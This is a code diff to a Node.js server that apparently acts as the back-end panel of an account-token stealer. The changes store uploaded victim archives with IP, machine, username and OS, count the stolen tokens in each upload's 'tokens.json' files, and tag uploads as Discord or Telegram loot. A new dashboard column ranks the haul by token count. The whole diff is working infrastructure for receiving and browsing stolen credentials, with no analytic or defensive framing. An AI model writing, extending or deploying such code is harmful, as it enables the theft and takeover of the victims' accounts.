@@ -38,6 +38,9 @@ async function initDb() {
       created_at TIMESTAMPTZ DEFAULT NOW()
     )
   `);
+  // add columns if upgrading from older schema
+  await pool.query(`ALTER TABLE grabs ADD COLUMN IF NOT EXISTS token_count INT DEFAULT 0`);
+  await pool.query(`ALTER TABLE grabs ADD COLUMN IF NOT EXISTS src TEXT DEFAULT 'dc'`);
   await pool.query(`
     CREATE TABLE IF NOT EXISTS settings (
       key TEXT PRIMARY KEY,
@@ -45,6 +48,33 @@ async function initDb() {
       bin BYTEA
     )
   `);
+}
+
+// Count tokens from zip buffer — called at upload time so dashboard shows counts instantly
+function countTokensInZip(buf) {
+  try {
+    const zip = new AdmZip(buf);
+    let total = 0;
+    zip.getEntries().forEach(e => {
+      if (!e.entryName.endsWith("/tokens.json")) return;
+      try {
+        const arr = JSON.parse(e.getData().toString("utf8"));
+        if (Array.isArray(arr)) total += arr.length;
+      } catch {}
+    });
+    return total;
+  } catch { return 0; }
+}
+
+// Detect source from m.json: "dc" | "tg" | "diag"
+function detectSrc(buf) {
+  try {
+    const zip = new AdmZip(buf);
+    const me = zip.getEntry("m.json");
+    if (!me) return "dc";
+    const m = JSON.parse(me.getData().toString("utf8"));
+    return m.src || "dc";
+  } catch { return "dc"; }
 }
 
 initDb().catch(e => console.error("[!] db init failed:", e.message));
@@ -141,13 +171,17 @@ app.post("/api/v1/sync", checkKey, upload.single("file"), async (req, res) => {
     const ts = Date.now();
     const filename = `${ts}_${crypto.randomBytes(6).toString("hex")}.dat`;
     const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
+    // Parse zip immediately — so dashboard shows token count + source without re-parsing later
+    const tokenCount = countTokensInZip(req.file.buffer);
+    const src = detectSrc(req.file.buffer);
     await pool.query(
-      `INSERT INTO grabs (id, filename, filedata, filesize, ip, machine, username, os, arch)
-       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
+      `INSERT INTO grabs (id, filename, filedata, filesize, ip, machine, username, os, arch, token_count, src)
+       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)`,
       [id, filename, req.file.buffer, req.file.size,
-       ip, req.query.m || "", req.query.u || "", req.query.o || "", req.query.a || ""]
+       ip, req.query.m || "", req.query.u || "", req.query.o || "", req.query.a || "",
+       tokenCount, src]
     );
-    res.json({ e: 0 });
+    res.json({ e: 0, tc: tokenCount });
   } catch (err) {
     console.error("[!] upload error:", err.message);
     res.status(500).json({ e: 2 });
@@ -157,7 +191,7 @@ app.post("/api/v1/sync", checkKey, upload.single("file"), async (req, res) => {
 app.get("/", checkKey, async (req, res) => {
   try {
     const [grabsRes, settingsRes] = await Promise.all([
-      pool.query(`SELECT id, filename, filesize, ip, machine, username, os, arch, created_at FROM grabs ORDER BY created_at DESC`),
+      pool.query(`SELECT id, filename, filesize, ip, machine, username, os, arch, created_at, COALESCE(token_count,0) as token_count, COALESCE(src,'dc') as src FROM grabs ORDER BY created_at DESC`),
       pool.query(`SELECT key, val, (bin IS NOT NULL AND length(bin)>0) as has_bin FROM settings`)
     ]);
     const rows = grabsRes.rows;
@@ -167,6 +201,7 @@ app.get("/", checkKey, async (req, res) => {
       id: r.id, f: r.filename, s: parseInt(r.filesize),
       t: r.created_at, ip: r.ip, m: r.machine,
       u: r.username, o: r.os, a: r.arch,
+      tc: parseInt(r.token_count || 0), src: r.src || "dc",
     }));
     const smap = {};
     settingsRes.rows.forEach(r => { smap[r.key] = r; });
@@ -213,13 +248,17 @@ function renderPage(entries, totalSize, k, { hasBg = false, theme = null } = {})
     const osTag = osIcon(e.o);
     const isWin = (e.o || "").toLowerCase().includes("windows");
     const fresh = isFresh(e.t);
+    const hasTok = e.tc > 0;
+    const srcTag = e.src === "tg" ? "TG" : "DC";
+    const srcCls = e.src === "tg" ? "tag-b" : "tag-g";
     return `<tr class="${fresh ? "fresh " : ""}row-${Math.min(i,15)}">
       <td class="mono muted ind">${esc(e.id)}</td>
-      <td><span class="tag ${isWin ? "tag-g" : "tag-b"}">${osTag}</span></td>
+      <td><span class="tag ${srcCls}">${srcTag}</span>&nbsp;<span class="tag ${isWin ? "tag-g" : "tag-b"}">${osTag}</span></td>
       <td class="mono">${esc(e.m)}${e.u ? `<span class='muted'>&nbsp;\\&nbsp;${esc(e.u)}</span>` : ""}</td>
       <td class="mono muted">${esc(e.a)}</td>
       <td class="mono muted">${esc(e.ip)}</td>
       <td class="mono">${fmtSize(e.s || 0)}</td>
+      <td class="mono ${hasTok ? "tok-yes" : "tok-no"}">${hasTok ? `<span class="tok-badge">&#9670; ${e.tc}</span>` : '<span class="muted">—</span>'}</td>
       <td><div class="ts">${fmtTime(e.t)}</div><div class="accent">${timeAgo(e.t)}</div></td>
       <td class="actions">
         <a class="btn btn-t" href="/dc/${esc(e.id)}?key=${k}" title="tokens">&#9670;</a>
@@ -423,6 +462,15 @@ tbody tr.fresh{animation:fadeUp .35s ease both,freshGlow 1.5s ease .4s 3}
 .btn-d:hover{background:rgba(248,113,113,0.1);color:var(--red);border-color:rgba(248,113,113,0.35)}
 .gear-btn{font-size:16px;transition:color .2s,transform .45s,border-color .2s,box-shadow .2s}
 .gear-btn:hover{color:var(--accent);border-color:rgba(176,110,255,0.35);transform:rotate(75deg);box-shadow:0 0 12px rgba(176,110,255,0.25)}
+.tok-badge{
+  display:inline-flex;align-items:center;gap:5px;
+  font-family:var(--mono);font-size:11px;font-weight:600;
+  color:var(--green);
+  background:rgba(74,222,128,0.08);
+  padding:3px 10px;border-radius:6px;
+  border:1px solid rgba(74,222,128,0.18)
+}
+.tok-no .muted{font-size:11px}
 .empty{text-align:center;padding:90px 20px;color:var(--muted);animation:fadeUp .5s ease .2s both}
 .empty .icon{font-size:34px;margin-bottom:16px;opacity:.2}
 .empty p{font-family:var(--mono);font-size:12px;letter-spacing:2px}
@@ -532,8 +580,8 @@ ${themeOverride}
   ${entries.length
     ? `<div class="table-wrap"><table>
         <thead><tr>
-          <th>ID</th><th>SYS</th><th>HOST</th><th>ARCH</th>
-          <th>ORIGIN</th><th>SIZE</th><th>RECEIVED</th><th></th>
+          <th>ID</th><th>SRC / SYS</th><th>HOST</th><th>ARCH</th>
+          <th>ORIGIN</th><th>SIZE</th><th>TOKENS</th><th>RECEIVED</th><th></th>
         </tr></thead>
         <tbody>${tableRows}</tbody>
       </table></div>`
